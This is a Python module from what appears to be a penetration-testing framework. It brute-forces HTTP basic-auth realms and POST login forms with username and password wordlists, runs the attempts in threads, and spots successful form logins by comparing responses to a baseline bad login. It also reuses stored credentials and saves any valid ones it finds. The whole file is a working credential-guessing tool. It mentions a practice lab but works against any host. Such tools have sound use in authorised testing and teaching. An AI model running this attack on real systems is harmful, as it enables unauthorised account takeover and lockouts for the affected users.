"""HTTP login brute force: basic-auth realms and POST forms.

Two modes, one engine:

  basic  GET with an Authorization header; success is the 401 wall opening
         (2xx). Other statuses (404, 500) mean you aimed at the wrong path.
  form   POST user/pass fields; success is harder to see because apps reply
         200 to both good and bad logins. Detection order:
           1. SUCCESS_STRING present in the body, if you set one
           2. FAILURE_STRING absent from the body, if you set one
           3. baseline deviation: before attacking we capture the response
              to a known-bad login and flag anything that differs in
              status or size — the same fingerprint trick as dir busting.

The engine uses a bounded queue + stop event rather than submitting all
combos to a pool: user x pass spaces get huge, memory stays constant, and
STOP_ON_SUCCESS actually stops early.
"""

import base64
import http.client
import time
import urllib.parse
from collections import namedtuple

from core.brute import brute_force
from core.module import AuxiliaryModule
from core.options import (
    OptAddress,
    OptBool,
    OptEnum,
    OptInt,
    OptPort,
    OptString,
)
from core.wordlists import build_combos, creds_from_options, load_lines  # noqa: F401

Result = namedtuple("Result", "status size text")
MAX_BODY = 64 * 1024  # enough for string matching; we never need whole pages


def basic_auth_value(user, password):
    raw = base64.b64encode(f"{user}:{password}".encode()).decode()
    return f"Basic {raw}"


def classify_basic(status):
    """success: the realm let us in. fail: 401. error: anything else."""
    if 200 <= status < 300:
        return "success"
    if status == 401:
        return "fail"
    return "error"


def classify_form(result, baseline, success_string, failure_string):
    """Does this form response look like a successful login?"""
    if success_string:
        return success_string in result.text
    if failure_string:
        return failure_string not in result.text
    if baseline is not None:
        return (result.status, result.size) != baseline
    return False


class HttpLogin(AuxiliaryModule):
    name = "HTTP Login Brute Force (basic auth & forms)"
    description = """
        Tries username/password combinations against an HTTP basic-auth
        realm or a POST login form. Form-mode success detection works even
        without a known marker string: it baselines the response to a
        known-bad login and flags deviations. Try it against the web lab:
        MODE basic TARGETPATH /protected, or MODE form TARGETPATH /login,
        with labs/web/wordlists/passwords.txt as PASS_FILE.
    """
    authors = ["you"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target host(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=80, description="Target port"))
        self.options.add(OptBool("SSL", default=False, description="Use HTTPS"))
        self.options.add(OptEnum("MODE", ["basic", "form"], default="basic",
                                 description="Attack basic auth or a POST form"))
        self.options.add(OptString("TARGETPATH", default="/",
                                   description="Auth path (/protected, /login, ...)"))
        self.options.add(OptString("USERNAME", default="", description="Single username"))
        self.options.add(OptString("USER_FILE", default="", description="Usernames file"))
        self.options.add(OptString("PASSWORD", default="", description="Single password"))
        self.options.add(OptString("PASS_FILE", default="", description="Passwords file"))
        self.options.add(OptString("USER_FIELD", default="username",
                                   description="Form field for the username"))
        self.options.add(OptString("PASS_FIELD", default="password",
                                   description="Form field for the password"))
        self.options.add(OptString("SUCCESS_STRING", default="",
                                   description="Form mode: body text proving success"))
        self.options.add(OptString("FAILURE_STRING", default="",
                                   description="Form mode: body text proving failure"))
        self.options.add(OptBool("STOP_ON_SUCCESS", default=True,
                                 description="Stop after the first valid credential"))
        self.options.add(OptInt("THREADS", default=4,
                                description="Concurrent attempts (keep low: lockouts)"))
        self.options.add(OptInt("TIMEOUT", default=5, description="Request timeout (seconds)"))

    # ------------------------------------------------------------------ probing
    def _request(self, host, port, use_ssl, method, path, headers, body, timeout):
        conn_cls = http.client.HTTPSConnection if use_ssl else http.client.HTTPConnection
        conn = None
        try:
            conn = conn_cls(host, port, timeout=timeout)
            conn.request(method, path, body=body, headers=headers)
            resp = conn.getresponse()
            text = resp.read(MAX_BODY).decode(errors="replace")
            return Result(resp.status, len(text), text)
        except (OSError, http.client.HTTPException):
            return None
        finally:
            if conn is not None:
                conn.close()

    def _try_basic(self, host, port, use_ssl, path, timeout, user, password):
        return self._request(host, port, use_ssl, "GET", path, {
            "Authorization": basic_auth_value(user, password),
            "User-Agent": "framework/0.4",
        }, None, timeout)

    def _try_form(self, host, port, use_ssl, path, user_field, pass_field,
                  timeout, user, password):
        body = urllib.parse.urlencode({user_field: user, pass_field: password})
        return self._request(host, port, use_ssl, "POST", path, {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "framework/0.4",
        }, body, timeout)

    # ------------------------------------------------------------------- engine
    def _brute(self, host, combos, attempt, classify):
        """Thin wrapper over core.brute.brute_force with console reporting."""
        def on_success(combo, _result):
            self.print_good(f"{host}: valid credential {combo[0]}:{combo[1]}")

        def on_error(_combo, result, count):
            if count == 1:
                self.print_warning(
                    f"{host}: unexpected status {result.status} -- check TARGETPATH"
                )

        return brute_force(
            combos, attempt, classify,
            threads=self.get_option("THREADS"),
            join_timeout=self.get_option("TIMEOUT") + 2,
            on_success=on_success,
            on_error=on_error,
        )

    # -------------------------------------------------------------------- run
    def run(self):
        try:
            users = creds_from_options(self.get_option, "USERNAME", "USER_FILE")
            passwords = creds_from_options(self.get_option, "PASSWORD", "PASS_FILE")
        except OSError as e:
            self.print_error(f"Cannot read credential file: {e}")
            return
        if not users or not passwords:
            self.print_error("Need at least one username and one password "
                             "(USERNAME/USER_FILE, PASSWORD/PASS_FILE)")
            return

        mode = self.get_option("MODE")
        path = str(self.get_option("TARGETPATH")) or "/"
        if not path.startswith("/"):
            path = "/" + path
        combos = list(build_combos(users, passwords))
        self.print_status(
            f"{len(users)} user(s) x {len(passwords)} password(s) = "
            f"{len(combos)} combinations, mode={mode}, path={path}"
        )
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._attack_host(host, mode, path, combos)

    def _attack_host(self, host, mode, path, combos):
        port = self.get_option("RPORT")
        use_ssl = self.get_option("SSL")
        timeout = self.get_option("TIMEOUT")
        scheme = "https" if use_ssl else "http"

        # stored creds get tried first — findings should compound
        store = getattr(self.framework, "store", None)
        if store is not None:
            stored = store.creds_for(host, scheme)
            if stored:
                self.print_status(
                    f"{host}: trying {len(stored)} stored credential(s) first"
                )
                stored_set = set(stored)
                combos = stored + [c for c in combos if c not in stored_set]

        if mode == "basic":
            attempt = lambda u, p: self._try_basic(host, port, use_ssl, path, timeout, u, p)  # noqa: E731
            classify = lambda r: classify_basic(r.status)  # noqa: E731
        else:
            user_field = self.get_option("USER_FIELD")
            pass_field = self.get_option("PASS_FIELD")
            attempt = lambda u, p: self._try_form(  # noqa: E731
                host, port, use_ssl, path, user_field, pass_field, timeout, u, p)
            success_string = str(self.get_option("SUCCESS_STRING") or "")
            failure_string = str(self.get_option("FAILURE_STRING") or "")
            baseline = None
            if not success_string and not failure_string:
                baseline_res = attempt(f"fw-baduser-{int(time.time())}", "fw-badpass")
                if baseline_res is not None:
                    baseline = (baseline_res.status, baseline_res.size)
                    self.print_status(
                        f"{host}: failure baseline is {baseline[0]}/{baseline[1]}b "
                        "-- flagging deviations"
                    )
                    self.print_debug(
                        f"{host}: baseline body: {baseline_res.text[:200]!r}"
                    )
                else:
                    self.print_error(f"{host}:{port} unreachable")
                    return
            classify = lambda r: "success" if classify_form(  # noqa: E731
                r, baseline, success_string, failure_string) else "fail"

        started = time.time()
        found, attempts, errors, possibles = self._brute(host, combos, attempt, classify)
        elapsed = max(time.time() - started, 0.001)
        self.print_status(
            f"{host}: {attempts} attempts in {elapsed:.1f}s, "
            f"{len(found)} valid, {errors} errors"
        )

        store = getattr(self.framework, "store", None)
        if store is not None and found:
            store.add_service(host, port, name=scheme)
            for user, pw in found:
                store.add_cred(host, scheme, user, pw, source=f"http-{mode}")
                self.print_status("Credential saved ('creds' to view)")
